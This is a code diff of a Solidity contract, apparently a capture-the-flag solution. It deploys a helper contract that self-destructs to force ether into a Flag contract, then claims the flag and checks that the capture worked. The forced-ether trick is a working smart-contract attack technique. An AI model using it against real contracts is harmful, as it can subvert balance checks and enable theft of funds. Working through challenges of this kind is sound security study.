@@ -26,15 +26,20 @@ contract Conquistador {
     function() public payable {
     }
 
-    function capture(ScapeGoat scapeGoat, Flag flag, bytes32 bragger) public payable {
-        scapeGoat.kill.value(msg.value)(flag);
+    function capture(Flag flag, bytes32 bragger) public payable {
+        (new ScapeGoat).value(msg.value)(flag);
+
+        uint oldBalance = address(this).balance;
+
         flag.capture(bragger);
+
+        require(address(this).balance > oldBalance);
+        require(flag.captured(this) == true);
     }
 }
 
 contract ScapeGoat {
-    function kill(address flag) public payable {
+    constructor(address flag) public payable {
         selfdestruct(flag);
     }
 }
-
